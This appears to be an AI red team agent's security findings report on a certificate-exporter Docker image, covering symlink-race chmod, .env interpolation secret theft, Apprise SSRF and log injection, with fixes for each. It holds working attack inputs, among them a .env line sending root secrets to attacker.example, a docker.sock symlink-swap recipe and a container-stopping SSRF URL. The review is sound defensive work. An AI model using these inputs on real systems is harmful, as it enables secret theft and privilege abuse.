# RED TEAM FINDINGS REPORT

Sprint: E015 / sprint-01 (E015-S01-001 … E015-S01-004)
Date: 2026-10-12
Analyst: Red Team Agent (l3io-sec-redteam, orchestrator/headless invocation)

## SEVERITY SUMMARY

| Severity | Count |
|---|---|
| CRITICAL | 0 |
| HIGH | 2 |
| MEDIUM | 2 |
| LOW | 4 |
| OBSERVATION | 1 |

## Scope, seeds and where the analysis widened

**Seeds read:** the working-tree diff against HEAD for `src`, `tests`, `docs`, `docker`,
`README.md`, `pyproject.toml` and `config.sample.yml`; untracked
`docs/adr/0051-pfx-fingerprint-sidecar.md` and `tests/test_container_root_trust.py`; the
titles and acceptance criteria of stories E015-S01-001 … 004; ADR-0049, ADR-0050 (via the
`pyproject.toml` guard block), ADR-0051 and the ADR-0030 amendment.

**Widened to, and why:**
- `docker/root/etc/s6-overlay/s6-rc.d/init-traefik-certificate-exporter-config/run`,
  `svc-traefik-certificate-exporter/run` and
  `docker/root/usr/local/lib/traefik-certificate-exporter/privilege-decision.sh`, to find who
  owns `settings.outputpath` when the exporter runs as root. ADR-0049's impact statement
  depends on the answer.
- `libs/certificate_exporter.py` outside the diff hunks (`_atomic_write`,
  `_inheritable_metadata`, `_breaks_write_policy`, `_is_contained_within`): the new sidecar
  code (ADR-0051) calls them on paths inside the output tree.
- `libs/notify.py` and the installed Apprise 1.13.1 `plugins/custom_json.py`, to check
  ADR-0049's "network egress only" claim for `appriseurls`.
- `libs/logging_utils.py` (`sanitize_for_log`), to check whether new log lines are
  sanitised.
- The built image `traefik-certificate-exporter:local` (48 min old at analysis time), to
  check the service's real euid and working directory, and who owns `/certs`. The container
  was run once and removed.

**Maintainer constraint applied:** no remediation below changes `/config` ownership,
`init-adduser`, `lsiown`, or the PUID/PGID convention (ADR-0049). Every fix is in the
exporter's own code, its own init script output, or its documentation.

**Attacker model used throughout:** the `PUID` account. On the host that is the operator's
user, and also every other container running as the same `PUID`, which on a LinuxServer host
is often all of them. This account can write `/config` (LinuxServer convention) and, as
RT-1 and RT-3 show, usually `/certs` too. ADR-0049's purpose is to stop this account from
acting through the root exporter. No auth code is in scope; authorization here means file
modes, uids and the Docker socket.

## FINDINGS

| Severity | ID | Title | Lens | Attack Path | Impact | Recommendation |
|---|---|---|---|---|---|---|
| HIGH | RT-1 | A `PUID`-writable output tree gives the root exporter's in-place chmod a symlink-race primitive: root can be made to chmod any path | CHA, EXT, DAR | See RT-1 below | Root sets the mode of a path the `PUID` account chooses to any subset of `0644` or `0600`, including `0000` | Use fd-based operations: `O_NOFOLLOW` open, `fstat`, `fchmod`, bounded read |
| HIGH | RT-2 | A root-mode `/config/.env` can copy the root environment's secrets into an admitted `appriseurls` value through python-dotenv interpolation, and send them off-host | INS, DAR | See RT-2 below | The `PUID` account reads values it must not see in root mode: the env-set root hook (a declared secret), the PKCS#12 passphrase, Apprise tokens and any other container secret | Load `.env` with `interpolate=False` in root mode, or drop any value that changed under interpolation |
| MEDIUM | RT-3 | ADR-0049's integrity claim assumes `/certs` is not `PUID`-writable in root mode, but the image and LinuxServer practice make it `PUID`-owned, and nothing reports it | DAR | See RT-3 below | ADR-0049's "a tree that account cannot write" is false in common deployments. RT-1 is reachable, and the closure of AG-1 is overstated | Correct the ADR text, and add a root-mode init note when `outputpath` is `PUID`-controlled |
| MEDIUM | RT-4 | `appriseurls` is classed "network egress only", but Apprise `json://`/`form://`/`xml://` sends arbitrary-method requests with a chosen path, query and headers from the exporter's network position | ABU, DAR, PBR | See RT-4 below | The `PUID` account gets SSRF into the container's networks, including a docker-socket-proxy, so it can stop or kill any container the proxy allows | Restrict file-sourced `appriseurls` in root mode, or correct the class rationale and document the SSRF |
| LOW | RT-5 | Names of variables that a root-mode `.env` added are logged unsanitised: newline and ESC log injection | EXT | A `.env` line `'EVIL\x1b[31m\nFAKE ERROR …'=1` | Forged log lines or terminal escapes in `docker logs` (the EC-003 class, reintroduced in new code) | Pass each name through `sanitize_for_log` |
| LOW | RT-6 | The root hook inherits `cwd=/config`, so any relative path in an env-set hook resolves into the `PUID`-writable tree | DAR | See RT-6 below | Root runs code that `abc` controls, through a hook the operator believes is environment-only | Run the hook with an explicit root-owned `cwd` |
| LOW | RT-7 | A file-sourced `validatekeys: false` turns off RSA key validation in the root process. The "availability only" rationale is wrong | DAR | `config.yaml`: `validatekeys: false` | Weakens the remaining defence against an AR-1 forged store (`unsafe_skip_rsa_key_validation`) | Class `validatekeys` environment-only when root, or correct the rationale |
| LOW | RT-8 | Sidecar, `.pfx` and PEM reads follow a symlink swapped in after `lstat`: `/dev/zero` or a FIFO makes the root pass hang or exhaust memory | CHA | Same race as RT-1, with `read_bytes()` as the sink | Availability of exports, restarts and the hook | Covered by RT-1's fd-based read with a byte bound |
| OBS | RT-9 | The sidecar's scrypt record is an offline guessing oracle for the PKCS#12 passphrase | DAR | Read `cert.pfx.fingerprint.json` | No new exposure: the record has the same `0600` and owner as the `.pfx`, which is itself an oracle. Scrypt N=16384 is no weaker | None. Recorded so it is not re-raised |

### RT-1 (HIGH): an in-place chmod on a `PUID`-writable tree follows a swapped-in symlink

- **Evidence:**
  - `src/traefik_certificate_exporter/libs/certificate_exporter.py:328` does `os.lstat(path)`,
    and `:343` then does `os.chmod(path, tightened)` on the name. `os.chmod` follows symlinks.
  - New callers in this sprint: `_read_pfx_fingerprint` (`:620`) and `_pfx_state` (`:666`).
    The existing callers are `_file_differs` (`:358`) and `_pfx_differs` (`:405`).
  - `tightened = current & policyMode`, where `current` is the mode of the attacker's own
    regular file. The attacker therefore picks the result: any subset of `0600` (secret
    artifacts and the sidecar) or of the umask policy, `0644` (`cert.pem`, `chain.pem`,
    `fullchain.pem`).
- **Precondition:** the directory is `PUID`-writable while the exporter runs as root (RT-3).
- **Attack path:**
  1. The `PUID` account loops in `/certs/<domain>/`, creating `cert.pfx.fingerprint.json` as
     a regular file with mode `0004`. Mode `0646` instead targets world-readable `0644`
     through `cert.pem`.
  2. In the same loop it renames a symlink to `/var/run/docker.sock` (or any other target)
     over that file.
  3. When the swap lands between `:328` and `:343`, root chmods the target.
- **Demonstrated:** `/tmp/rt-e015/race.py` against `.venv`. The window was injected
  deterministically by wrapping `os.lstat`, and `_read_pfx_fingerprint` was then called
  directly. Output:

  ```
  victim mode before: 0o600
  Tightened mode of …/cert.pfx.fingerprint.json from 0004 to 0000 …
  victim mode after : 0o0
  ```

  The WARNING names the sidecar, not the victim, so the log hides the effect.
- **Impact:** the `PUID` account controls the mode of any path root can reach:
  - the bind-mounted `docker.sock` set to `0000`/`0600` on the host inode, which locks out
    the host's `docker` group;
  - the container's interpreter or venv, which stops the exporter at the next start;
  - host files on any read-write bind mount set to `0644`, which makes root-only data
    world-readable.

  Only a read-only mount (`/data:ro`) blocks it, with `EROFS`. The same class of race exists
  for the per-domain directory: containment is checked once with `resolve()` at `:1265`,
  then the files are written through `directory` (`_atomic_write` creates its temp file
  with `dir=directory`). Swapping `/certs/<domain>` for a directory symlink redirects root's
  writes of `privkey.pem`, `cert.pem` and the others into any directory. This was not
  demonstrated; it is the same root cause.
- **Remediation:** no LinuxServer impact.
  1. Replace the `lstat`-then-`chmod` and `lstat`-then-`read_bytes` pairs with one open:
     `fd = os.open(path, O_RDONLY | O_NOFOLLOW | O_NONBLOCK | O_CLOEXEC)`, then
     `os.fstat(fd)` with an `S_ISREG` check, then `os.fchmod(fd, tightened)`, then a
     bounded read from the fd (`_PFX_FINGERPRINT_MAX_BYTES` for the sidecar).
  2. Open the domain directory once with `O_DIRECTORY | O_NOFOLLOW` and do every create,
     replace and chmod relative to it (`dir_fd=` on `os.open`, `os.replace` and `os.chmod`).
  3. Add a test that plants the swap through a monkeypatched `lstat`, as the script above
     does.

### RT-2 (HIGH): `.env` interpolation exfiltrates root-environment secrets

- **Evidence:**
  - `src/traefik_certificate_exporter/libs/settings.py:608` calls `load_dotenv(path)` with
    python-dotenv's default `interpolate=True`.
  - `_isAnySourceEnvName` (`:632`) then keeps any newly added variable of an `any-source`
    key, `..._SETTINGS_APPRISEURLS_<n>` included. It checks the name, never how the value
    was built.
  - The image runs the root exporter with `cwd=/config`. Observed on
    `traefik-certificate-exporter:local`: the python process had `uid=0`
    `cwd=/config`. `docs/operational.md:353` confirms `/config/.env` is read in root mode.
- **Attack path:** the `PUID` account writes this `/config/.env`:

  ```
  TRAEFIK_CERTIFICATE_EXPORTER_SETTINGS_APPRISEURLS_0=json://attacker.example/?-hook=${TRAEFIK_CERTIFICATE_EXPORTER_SETTINGS_POSTEXPORTCOMMAND}&-pw=${TRAEFIK_CERTIFICATE_EXPORTER_SETTINGS_PKCS12PASSPHRASE}
  ```

  It also sets `runatstart: true` and a new `pkcs12passphrase` in `config.yaml`. Both are
  `any-source`, and a passphrase change rebuilds every `.pfx` and reports every domain
  (ADR-0051 Decision 3). At the next start, root expands the real environment into the URL
  and notifies the attacker's host.
- **Demonstrated:** `/tmp/rt-e015/interp.py`, a full `SettingsManager.loadFromFile` with
  `_is_root` forced true. Output:

  ```
  appriseUrls: ["json://attacker.example/?-hook=notify --token <hook-secret> https://ci/hook&-pw=pfx-pass"]
  source: environment
  ```

  The URL is also reported as coming from the environment, so the start-up log suggests the
  operator set it.
- **Impact:**
  - The confidentiality of every variable in the root process's environment crosses the
    boundary ADR-0049 draws. That includes the env-set `postexportcommand`, which ADR-0045
    declares a secret and which often carries a bearer token, plus
    `pkcs12passphrase`, Apprise URLs with tokens, `DOCKER_*` credentials and unrelated
    secrets that compose passes to the container.
  - The same interpolation can copy any secret into `domains.include` or
    `traefikresolverid`, which then reach logs.
- **Remediation:**
  1. In `_loadDotenvAsRoot`, call `load_dotenv(path, interpolate=False)`. Alternatively,
     parse the file with `dotenv_values(path, interpolate=False)` and compare the result
     with the interpolated values, dropping any variable whose value differs.
  2. Add a root-mode test that plants a `${…}` reference to a real env secret and asserts the
     secret does not appear in the admitted value.
  3. ADR-0049 Decision 4 should record that interpolation is disabled.

### RT-3 (MEDIUM): the root exporter writes into a `PUID`-owned output tree

- **Evidence:**
  - ADR-0049 Context, "Impact, calibrated" (`docs/adr/0049-…md:77`) says root writes "into a
    tree that account cannot write".
  - The init script `init-traefik-certificate-exporter-config/run` chowns the resolved
    `outputpath` to `abc` in dropped mode (the `find … -exec chown -h` block) and never
    reverses it when a later start is in root mode. Root mode returns at
    `privilege-decision.sh` row 2 before any ownership check.
  - `restartcontainers` is `any-source` (`settings.py:82-83`), so the `PUID` account can
    force that flip from `config.yaml`.
  - On the built image with the host-created `/certs` that LinuxServer users normally make,
    `/certs` was `drwxrwxrwx abc abc` while the exporter ran as `uid=0`.
  - `docs/operational.md:362-365` requires `/data:ro` but says nothing about `/certs`.
- **Attack path:** boot once in dropped mode (or create `./certs` on the host as `PUID`), set
  `restartcontainers: true`, and wait for a restart. The root exporter now works in a tree the
  `PUID` account controls, which enables RT-1 and RT-8. Independently, the `PUID` account can
  replace `/certs/<domain>/privkey.pem` and `cert.pem` directly between passes, and every
  consumer that reloads gets the forged pair. That is the integrity outcome AG-1 was closed
  to prevent, reached without the exporter.
- **Remediation:** no LinuxServer impact.
  1. Correct ADR-0049's impact text and Consequences.
  2. Emit an INFO/WARNING note from the init script in root mode when
     `_tce_user_controls abc <outputpath>` is true. This is the same mechanism as the existing
     writable-store note, and can be folded into BL-E015-004.
  3. State in `docs/operational.md` that in root mode `/certs` should be owned by root (or by
     the consumer's account), not by `PUID`, or else that the `PUID` account controls the
     certificates consumers read.
  4. Fixing RT-1 removes the root-side primitive whatever the ownership.

### RT-4 (MEDIUM): `appriseurls` is an arbitrary-request primitive, not "egress only"

- **Evidence:**
  - `settings.py:98-99` and ADR-0049 Decision 2 (`docs/adr/0049-…md:137`) class it as
    "Network egress only".
  - `libs/notify.py:55-61` passes each URL to `apprise.Apprise().add`.
  - Apprise 1.13.1 `plugins/custom_json.py:139-192` accepts `method=` (GET, POST, PUT, PATCH,
    DELETE, HEAD), any path, `-param` query arguments, `+header` headers and `:key`
    payload overrides.
- **Attack path:** from `config.yaml`, set:

  ```yaml
  appriseurls: ["json://docker-socket-proxy:2375/containers/traefik/stop?method=POST"]
  ```

  and induce a reported domain as in RT-2. `docs/operational.md:97-99,502-505` recommends
  exactly this proxy topology for `restartcontainers` without the socket. Tecnativa's proxy
  allowlists by section (`CONTAINERS`, `POST`), not by path, so stop, kill and similar calls
  pass. Any unauthenticated internal admin API on the container's networks is reachable the
  same way.
- **Impact:** the `PUID` account can stop or kill any container through the proxy, or reach
  internal services that the host user cannot reach directly.
- **Remediation:**
  - Either make file-sourced `appriseurls` environment-only when root;
  - or, keeping `any-source`, refuse in root mode the schemes that send to a free-form host,
    path or method (`json`, `jsons`, `form`, `forms`, `xml`, `xmls`) unless they come from the
    environment.
  - At minimum, correct the rationale in `ROOT_SETTING_TRUST` and ADR-0049 to "outbound
    HTTP(S) requests with attacker-chosen method, path and headers from the exporter's
    network namespace", and add it to the residual risks.

### RT-5 (LOW): unsanitised variable names in the `.env` ERROR line

- **Evidence:** `settings.py:696-703` joins the raw names into the ERROR. python-dotenv accepts
  quoted keys containing ESC and newline. Demonstrated: the resulting `os.environ` key was
  `'EVIL\x1b[31mKEY\nFAKE: ERROR forged line'`. `legacy_settings.py:387` sanitises the
  equivalent names, but this new line does not.
- **Remediation:** `', '.join(sanitize_for_log(n) for n in names)`, plus a test with a
  newline-bearing key.

### RT-6 (LOW): the root hook's working directory is `/config`

- **Evidence:** `libs/post_export.py:88-92` calls `subprocess.run` without `cwd`, so the hook
  inherits the exporter's `cwd=/config`, which was observed on the image. The documented
  residual (`docs/operational.md:368-370`, "must not run a program stored in `/config`")
  covers explicit paths but not implicit ones. For example,
  `TRAEFIK_CERTIFICATE_EXPORTER_SETTINGS_POSTEXPORTCOMMAND="sh deploy.sh"` or
  `"python -m mytool"` (cwd is first on `sys.path`) runs `abc`-writable code as root.
- **Remediation:**
  - Pass `cwd=` set to a root-owned directory (for example `/` or the resolved
    `outputpath`).
  - Document that relative paths in the hook resolve there.

### RT-7 (LOW): `validatekeys` is not "availability only"

- **Evidence:**
  - `settings.py:96-97` classes it `any-source`.
  - `certificate_exporter.py:442` `_load_private_key` passes
    `unsafe_skip_rsa_key_validation=not validate`. ADR-0051 itself cites cryptography's
    warning that user-supplied keys must not be loaded this way.
- **Attack path:** combined with AR-1 (a `PUID`-writable store), the `PUID` account also
  removes the remaining structural check on the keys root loads.
- **Remediation:**
  - Class `validatekeys` `environment-only-when-root`. Its default is safe, so withholding
    loses nothing.
  - Or reword its rationale to "weakens key validation; acceptable only because the store is
    required `:ro`".

### RT-8 (LOW): reads follow a swapped-in symlink

- **Evidence:** `certificate_exporter.py`:
  - `:622-624`: the sidecar's `lstat().st_size` is checked, then `read_bytes()` follows the
    name;
  - `:362`, `:407`, `:677` and `:1324`: the same pattern.

  A swap to `/dev/zero` grows memory until the OOM killer acts. The `MemoryError` is
  swallowed into `verify` at `:693` only if it is raised before the kill. A swap to a FIFO
  blocks the pass.
- **Remediation:** RT-1's `O_NOFOLLOW | O_NONBLOCK` open with an `fstat` and bounded read.

## EXECUTIVE SUMMARY

Reviewed: sprint E015-S01, a security release that stops the `PUID` account (owner of
`/config` under LinuxServer convention) from choosing what the root exporter runs, writes or
trusts. It adds the `ROOT_SETTING_TRUST` withholding, root-mode `.env` filtering, `filespec`
validation, the ruff spawn-site guard, the `.pfx` fingerprint sidecar with optional RSA
validation, watch-mode rename handling and legacy env-name warnings. The stack is a Python
3.11–3.14 CLI and a LinuxServer s6 image.

The headline fixes hold under attack:
- a `config.yaml` hook, `outputpath` or `datapath` is withheld;
- `filespec` cannot leave `datapath`;
- `.env` cannot add `LD_PRELOAD`, `DOCKER_HOST` or logging keys;
- the spawn guard is unusually honest about its reach.

Overall posture: **HIGH**. Two boundary crossings remain, and both are reachable through
inputs ADR-0049 deliberately admits. The most dangerous is **RT-2**: one line in
`/config/.env` uses python-dotenv's default variable interpolation to copy the root
environment's secrets, including the env-set hook that ADR-0045 declares secret, into an
admitted Apprise URL that is sent off-host. It was demonstrated end to end at the settings
layer and takes a one-argument fix (`interpolate=False`). **RT-1** is the structural one.
ADR-0049 assumes `/certs` is not `PUID`-writable, but the dropped-mode init and ordinary
LinuxServer practice make it `PUID`-owned. The root exporter's lstat-then-chmod
(now also used for the new sidecar) is then a demonstrated "root chmods any path"
primitive. The most important recommendation is to move every output-tree operation in
`certificate_exporter.py` to fd-based, `O_NOFOLLOW`, `dir_fd`-relative calls, and to correct
ADR-0049's claim about `/certs` in the same change. Neither touches `/config` ownership or
LinuxServer's init.

## Reproduction artifacts

The scripts are outside the repository: `/tmp/rt-e015/race.py` (RT-1), `/tmp/rt-e015/interp.py`
with `/tmp/rt-e015/.env` (RT-2), and `/tmp/rt-e015/t.env` (RT-5). The image probe ran the
container `rt-e015-cwd` from `traefik-certificate-exporter:local`, with
`TRAEFIK_CERTIFICATE_EXPORTER_SETTINGS_RESTARTCONTAINERS=true` and `/data:ro`; the container
was removed afterwards. No source file was modified and nothing was committed.
